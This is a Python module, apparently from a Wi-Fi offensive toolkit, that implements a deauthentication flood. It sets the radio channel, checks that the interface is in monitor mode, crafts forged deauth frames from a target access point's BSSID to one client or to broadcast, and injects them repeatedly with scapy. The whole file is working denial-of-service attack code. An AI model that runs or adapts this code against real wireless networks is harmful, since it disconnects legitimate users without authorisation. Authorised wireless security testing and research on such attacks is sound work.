"""Deauthentication flood against an AP or a specific client."""

from __future__ import annotations

from scapy.sendrecv import sendp

from ..frames import BROADCAST, craft_deauth
from ..radio import get_mode, set_channel


def deauth(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    count: int = 64,
    interval: float = 0.05,
    channel: int | None = None,
    low_rate: bool = False,
    progress_fn=None,
) -> int:
    """Send count deauth frames from bssid to client.

    low_rate: force injection at 6 Mbps instead of the adapter's
    auto/unset rate -- see frames.craft_deauth for why. Opt-in since it
    costs airtime; most adapters don't need it.

    Returns the count actually handed to the OS for transmission -- 0 if
    iface isn't in monitor mode (frames can't go out at all) or if the
    socket write itself raised, `count` otherwise. This is NOT proof of
    over-the-air reception: this hardware's TX packet counters (`ip -s
    link`) aren't instrumented for monitor-mode injection at all
    (confirmed live via a second-radio witness -- see STATUS.md), so
    there's no cheap from-Python way to verify actual RF transmission.
    What this DOES catch is the real, previously-silent failure mode of
    calling deauth() against an interface that isn't actually in monitor
    mode (e.g. a stale lock, a failed monitor-mode setup) -- previously
    sendp() would just silently succeed at the OS level while nothing
    left the radio, indistinguishable from "ran fine, target just didn't
    respond".
    """
    log = progress_fn or (lambda msg: None)
    if channel is not None:
        set_channel(iface, channel)
        log(f"channel set to {channel}")

    mode = get_mode(iface)
    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- deauth frames cannot transmit")
        return 0

    pkt = craft_deauth(bssid=bssid, client=client, low_rate=low_rate)
    try:
        sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
    except OSError as exc:
        log(f"deauth send failed: {exc}")
        return 0
    log(f"sent {count} deauth frame(s) {bssid} -> {client}")
    return count
